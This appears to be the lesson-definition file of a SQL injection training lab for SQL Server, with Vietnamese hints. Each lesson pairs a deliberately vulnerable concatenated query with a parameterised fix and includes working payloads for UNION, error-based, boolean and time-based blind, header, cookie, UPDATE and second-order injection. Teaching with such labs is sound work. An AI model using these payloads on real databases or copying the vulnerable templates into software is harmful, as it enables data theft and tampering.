"""The SQL shown in the lesson notebook is also the SQL the runner executes."""

from dataclasses import dataclass


@dataclass(frozen=True)
class Lesson:
    number: int
    title: str
    technique: str
    method: str
    source: str
    key: str
    baseline: str
    goal: str
    hint: str
    probes: tuple
    vulnerable_sql: str
    fixed_sql: str
    result: str

    @property
    def group(self):
        return (self.number - 1) // 4


GROUPS = (
    ("In-band", "Đọc dữ liệu trực tiếp"),
    ("Blind", "Suy luận từ phản hồi"),
    ("Ngữ cảnh", "Theo dấu đầu vào"),
)

ITEM = "SELECT id, title FROM dbo.catalog"
BY_ID = ITEM + " WHERE id = {input}"
BY_ID_FIXED = ITEM + " WHERE id = TRY_CONVERT(int, ?)"
BY_SKU = ITEM + " WHERE sku = N'{input}'"
BY_SKU_FIXED = ITEM + " WHERE sku = ?"
EXISTS_SKU = "SELECT 1 FROM dbo.catalog WHERE sku = N'{input}'"
EXISTS_SKU_FIXED = "SELECT 1 FROM dbo.catalog WHERE sku = ?"
EXISTS_INVITE = "SELECT 1 FROM dbo.invites WHERE invite_code = N'{input}'"
EXISTS_INVITE_FIXED = "SELECT 1 FROM dbo.invites WHERE invite_code = ?"

LESSONS = (
    Lesson(
        1, "Một dòng ngoài danh mục", "UNION-based", "GET", "url", "id", "1",
        "Lấy mã của thẻ union-id từ bảng dbo.lab_notes qua trang chi tiết sản phẩm.",
        "Trang đọc dòng đầu tiên. Hãy chọn một id không tồn tại, rồi ghép một SELECT "
        "có hai cột tương thích: một số và một chuỗi.",
        (("ID không tồn tại", "-1"),
         ("Ghép thêm một dòng", "-1 UNION ALL SELECT 0, code FROM dbo.lab_notes WHERE tag='union-id'")),
        BY_ID, BY_ID_FIXED, "first",
    ),
    Lesson(
        2, "Trộn kết quả tìm kiếm", "UNION-based", "POST", "form", "q", "Sổ",
        "Hiển thị mã union-form ngay bên cạnh các sản phẩm trong kết quả tìm kiếm.",
        "Giá trị q nằm giữa hai dấu % của LIKE. Đóng chuỗi, thêm hàng kết quả, rồi xử lý "
        "phần cuối của câu SQL. Form này hiển thị nhiều dòng.",
        (("Tìm toàn bộ danh mục", "%"),
         ("Thêm kết quả", "Sổ%' UNION ALL SELECT 0, code FROM dbo.lab_notes WHERE tag='union-form'-- ")),
        ITEM + " WHERE title LIKE N'%{input}%'",
        ITEM + " WHERE title LIKE N'%' + ? + N'%'", "rows",
    ),
    Lesson(
        3, "Đọc một lỗi chuyển kiểu", "Error-based", "GET", "url", "sku", "MK-01",
        "Tìm mã error-sku trong thông báo lỗi do SQL Server trả về.",
        "Thử dấu nháy để nhận ra ngữ cảnh chuỗi. Sau đó buộc SQL Server chuyển mã "
        "văn bản sang int. Giá trị gây lỗi có thể xuất hiện trong chẩn đoán.",
        (("Thử dấu nháy", "MK-01'"),
         ("Tạo lỗi chuyển kiểu", "x' OR id=CONVERT(int,(SELECT code FROM dbo.lab_notes WHERE tag='error-sku'))-- ")),
        BY_SKU, BY_SKU_FIXED, "rows",
    ),
    Lesson(
        4, "Truy vấn con trong lỗi", "Error-based", "POST", "form", "id", "2",
        "Đọc mã error-id qua lỗi của một biểu thức ở vị trí số.",
        "id đi thẳng vào biểu thức số. Dùng một SELECT con làm đối số của CONVERT. "
        "Đây là biến thể T-SQL cho mục tiêu Double Query của bản MySQL.",
        (("Thử biểu thức số", "1+1"),
         ("Đọc mã qua lỗi", "CONVERT(int,(SELECT code FROM dbo.lab_notes WHERE tag='error-id'))")),
        BY_ID, BY_ID_FIXED, "rows",
    ),
    Lesson(
        5, "Một bit từ danh mục", "Boolean-based", "GET", "url", "sku", "MK-01",
        "Suy ra chữ cái đầu của mã blind-sku bằng hai phản hồi có / không.",
        "Giữ một SKU hợp lệ và thay đổi điều kiện AND. Khi đã có cặp đúng/sai "
        "đối chứng, thử từng tiền tố của mã với LIKE.",
        (("Điều kiện sai", "MK-01' AND 1=2-- "),
         ("Thử tiền tố K", "MK-01' AND EXISTS(SELECT 1 FROM dbo.lab_notes WHERE tag='blind-sku' AND code LIKE 'K%')-- ")),
        EXISTS_SKU, EXISTS_SKU_FIXED, "exists",
    ),
    Lesson(
        6, "Kiểm tra mã mời", "Boolean-based", "POST", "form", "invite", "OPEN-LAB",
        "Dùng phản hồi của form kiểm tra mã mời để suy ra tiền tố của blind-form.",
        "Form chỉ báo mã hợp lệ hoặc không hợp lệ. Kết hợp mã mời có thật với "
        "một điều kiện trên mã cần tìm, rồi thay chữ cái trong điều kiện.",
        (("Điều kiện sai", "OPEN-LAB' AND 1=2-- "),
         ("Thử tiền tố M", "OPEN-LAB' AND EXISTS(SELECT 1 FROM dbo.lab_notes WHERE tag='blind-form' AND code LIKE 'M%')-- ")),
        EXISTS_INVITE, EXISTS_INVITE_FIXED, "invite",
    ),
    Lesson(
        7, "Đo độ trễ của truy vấn", "Time-based", "GET", "url", "id", "1",
        "Xác định tiền tố của time-id khi nội dung phản hồi luôn giống nhau.",
        "T-SQL dùng WAITFOR DELAY như một câu lệnh. Kết thúc biểu thức id, rồi "
        "đặt độ trễ hai giây sau IF. Đo lại với một tiền tố sai làm đối chứng.",
        (("Đối chứng nhanh", "1; IF 1=2 WAITFOR DELAY '00:00:02'"),
         ("Thử tiền tố T", "1; IF EXISTS(SELECT 1 FROM dbo.lab_notes WHERE tag='time-id' AND code LIKE 'T%') WAITFOR DELAY '00:00:02'")),
        "SELECT 1 FROM dbo.catalog WHERE id = {input}",
        "SELECT 1 FROM dbo.catalog WHERE id = TRY_CONVERT(int, ?)", "time",
    ),
    Lesson(
        8, "Một form, cùng phản hồi", "Time-based", "POST", "form", "invite", "OPEN-LAB",
        "Tìm tiền tố của time-form qua độ trễ khi gửi form xác nhận.",
        "Lần này giá trị nằm trong dấu nháy. Hãy đóng chuỗi trước khi thêm IF. "
        "So sánh nhiều lần đo của cùng một điều kiện đúng và sai.",
        (("Đối chứng nhanh", "OPEN-LAB'; IF 1=2 WAITFOR DELAY '00:00:02'-- "),
         ("Thử tiền tố W", "OPEN-LAB'; IF EXISTS(SELECT 1 FROM dbo.lab_notes WHERE tag='time-form' AND code LIKE 'W%') WAITFOR DELAY '00:00:02'-- ")),
        EXISTS_INVITE, EXISTS_INVITE_FIXED, "time",
    ),
    Lesson(
        9, "Header đi vào nhật ký", "Header · INSERT", "POST", "header", "X-Lab-Client", "LabBrowser",
        "Đọc mã header qua lỗi khi tên client được ghi vào nhật ký.",
        "Workbench gửi header X-Lab-Client thật. Nếu bỏ header này, route dùng "
        "User-Agent như bài gốc. Ghép một biểu thức chuyển kiểu vào giá trị INSERT.",
        (("Thử dấu nháy", "LabBrowser'"),
         ("Lỗi khi ghi nhật ký", "lab'+CONVERT(nvarchar(50),CONVERT(int,(SELECT code FROM dbo.lab_notes WHERE tag='header')))+N'")),
        "INSERT dbo.visit_log (client_name) VALUES (N'{input}')",
        "INSERT dbo.visit_log (client_name) VALUES (?)", "insert",
    ),
    Lesson(
        10, "Cookie chọn sản phẩm", "Cookie · UNION", "GET", "cookie", "lab_visitor", "MK-01",
        "Giữ nguyên URL và đọc mã cookie bằng cách thay giá trị cookie lab_visitor.",
        "Ứng dụng đọc SKU từ cookie. Thử một SKU không tồn tại rồi ghép kết quả "
        "hai cột. Workbench mã hóa giá trị cookie trước khi gửi.",
        (("SKU không tồn tại", "NONE"),
         ("Đọc mã qua cookie", "NONE' UNION ALL SELECT 0, code FROM dbo.lab_notes WHERE tag='cookie'-- ")),
        BY_SKU, BY_SKU_FIXED, "first",
    ),
    Lesson(
        11, "Đổi hai cột trong hồ sơ", "UPDATE", "POST", "form", "name", "Minh",
        "Qua ô tên hiển thị, đổi cả cột badge của hồ sơ từ Member sang Mentor.",
        "Tên nằm trong mệnh đề SET. Hãy đóng chuỗi tên rồi thêm một phép gán. "
        "Hai chế độ giữ hồ sơ riêng để bạn so sánh cùng một payload.",
        (("Tên có dấu nháy", "O'Brien"),
         ("Thêm phép gán", "Minh', badge=N'Mentor")),
        "UPDATE dbo.profiles SET display_name=N'{input}' WHERE scope=CONVERT(varchar(33), SESSION_CONTEXT(N'lab_scope'))",
        "UPDATE dbo.profiles SET display_name=? WHERE scope=CONVERT(varchar(33), SESSION_CONTEXT(N'lab_scope'))",
        "update",
    ),
    Lesson(
        12, "Bộ lọc được dùng lại", "Second-order", "POST", "stored", "filter", "MK-01",
        "Lưu một bộ lọc rồi dùng request thứ hai để đọc mã saved từ dbo.lab_notes.",
        "Bước lưu dùng tham số ở cả hai chế độ. Bước chạy đọc lại giá trị từ "
        "database để lọc danh mục. Hai request phải dùng cùng cookie phiên.",
        (("Lưu SKU thường", "MK-02"),
         ("Bộ lọc có UNION", "NONE' UNION ALL SELECT 0, code FROM dbo.lab_notes WHERE tag='saved'-- ")),
        BY_SKU, BY_SKU_FIXED, "stored",
    ),
)

BY_NUMBER = {lesson.number: lesson for lesson in LESSONS}
